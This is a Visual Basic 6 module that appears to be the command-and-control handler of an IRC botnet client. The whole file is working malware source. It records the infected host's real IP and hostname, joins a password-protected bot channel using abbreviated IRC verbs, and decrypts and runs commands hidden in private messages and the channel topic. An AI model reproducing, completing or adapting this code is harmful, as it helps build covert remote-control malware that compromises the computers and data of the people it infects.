Attribute VB_Name = "modData"
Option Explicit

Public bBuffer() As Byte

Public Sub IRCParseBlock()
    Dim lngUbound As Long, lngNewUbound As Long
    Dim i As Long, x As Long
    
    On Local Error GoTo TheEnd
    lngUbound = UBound(bBuffer)
    'On Local Error GoTo TheEnd
    On Local Error GoTo ErrHand
    
    'remove carriage returns
    Do
        If bBuffer(i) = 13 Then
            ArrayRemoveB bBuffer, i
            i = i - 1
            lngUbound = lngUbound - 1
        End If
        i = i + 1
    Loop While i <= lngUbound
    
    Dim bNew() As Byte
    Dim sOut As String
    'go through buffer and find line feeds, and send all lines to the line parser
FindNewLine:
    For i = 0 To lngUbound
        If bBuffer(i) = 10 Then
            'build string to be parsed
            If i = 0 Then
                ArrayRemoveB bBuffer, i
                lngUbound = lngUbound - 1
                GoTo FindNewLine
            End If
            ReDim bNew(i - 1)
            sOut = vbNullString
            For x = 0 To i - 1
                bNew(x) = bBuffer(x)
            Next
            'parse it
            ByteArrayToString bNew, sOut
            IRCParseLine sOut
            
            'remove old data from buffer
            For x = 0 To lngUbound - (i + 1)
                bBuffer(x) = bBuffer(x + i + 1)
            Next
            lngNewUbound = lngUbound - (i + 1)
            If lngNewUbound = -1 Then
                Erase bBuffer
                Exit Sub
            Else
                ReDim Preserve bBuffer(lngUbound - (i + 1))
            End If
            lngUbound = lngUbound - (i + 1)
            
            GoTo FindNewLine
        End If
    Next
TheEnd:

    Exit Sub
ErrHand:
    DirectMsgChan "IRCParseBlock #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub

Private Sub IRCParseLine(strLine As String)
    'On Local Error Resume Next
    On Local Error GoTo ErrHand
    Dim strWord() As String
    Dim tmpSplit() As String
    Dim Parameters As String
    
    strWord = Split(strLine, " ")
    tmpSplit = Split(strLine, ":", 3)
    If UBound(tmpSplit) > 1 Then
        Parameters = tmpSplit(2)
    End If
    
    'we recieved data from the server... count that as a "ping"
    Client.Pinged = True
    
    If UBound(strWord) < 0 Then Exit Sub
    Select Case strWord(0)
        Case "PI" 'butchered IRC server :O
            If UBound(tmpSplit) > 0 Then
                IRCSendData "PO :" & tmpSplit(1)
            Else
                IRCSendData "PO"
            End If
            Exit Sub
        Case "PING" 'normal ping
            If UBound(tmpSplit) > 0 Then
                IRCSendData "PONG :" & tmpSplit(1)
            Else
                IRCSendData "PONG"
            End If
            Exit Sub
    End Select
    
    If UBound(strWord) < 1 Then Exit Sub
    Select Case strWord(1)
        Case "001"
            'try to get local ip and hostname
            tmpSplit = Split(strLine, "@", 2)
            If UBound(tmpSplit) > 0 Then
                Dim strHost As String
                strHost = FilterHostname(tmpSplit(1))
                If IsIP(strHost) Then
                    Client.RealIP = strHost
                    Client.RealHost = AddressToName(Client.RealIP)
                Else
                    Client.RealHost = strHost
                    Client.RealIP = NameToAddress(Client.RealHost)
                End If
            End If
            If Len(Client.RealHost) = 0 Then Client.RealHost = "Unknown"
            If Len(Client.RealIP) = 0 Then Client.RealIP = "Unknown"
            
            'join bot channel
            If Len(Servers(lngServerIndex).strChanPass) = 0 Then
                '[JOIN]
                IRCSendData "J " & Servers(lngServerIndex).strChannel
            Else
                '[JOIN]
                IRCSendData "J " & Servers(lngServerIndex).strChannel & " " & Servers(lngServerIndex).strChanPass
            End If
            
            'send unsent channel messages
            If MessageCount > 0 Then
                Dim i As Long
                For i = 0 To MessageCount - 1
                    If Messages(i).blnDirect = True Then
                        DirectMsgChan Messages(i).strMessage, Messages(i).strChannel
                    Else
                        MsgChan Messages(i).strMessage, Messages(i).lngIndex, Messages(i).strChannel
                    End If
                Next
                
                ReDim Messages(0)
                MessageCount = 0
            End If
        '[PRIVMSG]
        Case "P"
            If VBA.Left$(Parameters, 1) = "" Then
                Parameters = EnDeCrypt(yDecode(Right$(Parameters, Len(Parameters) - 1)))
            Else
                Exit Sub
            End If
            
            If strWord(2) = Client.Nick Then
                tmpSplit = Split(strLine, "!", 2)
                tmpSplit(0) = Right$(tmpSplit(0), Len(tmpSplit(0)) - 1)
                Call SplitCommands(Parameters, tmpSplit(0))
            Else
                Call SplitCommands(Parameters, strWord(2))
            End If
        '[NICK]
        Case "N"
            tmpSplit = Split(strLine, "!", 2)
            tmpSplit(0) = Right$(tmpSplit(0), Len(tmpSplit(0)) - 1)
            If tmpSplit(0) = Client.Nick Then
                Client.Nick = Parameters
                Call SaveSetting("config.nick", Parameters)
            End If
        Case "332" 'topic
            If VBA.Left$(Parameters, 1) = "" Then
                If strWord(3) = Servers(lngServerIndex).strChannel Then
                    Call SplitCommands(EnDeCrypt(yDecode(Right$(Parameters, Len(Parameters) - 1))), Servers(lngServerIndex).strChannel)
                End If
            End If
        Case "433" 'nick already taken
            Dim strNewNick As String
            strNewNick = GenerateNick
            Client.Nick = strNewNick
            Call SaveSetting("config.nick", strNewNick)
            '[NICK]
            IRCSendData ("N " & strNewNick)
    End Select
    
    Exit Sub
ErrHand:
    DirectMsgChan "IRCParseLine #" & Err.Number & ": " & Err.Description, "#db"
    Resume Next
End Sub
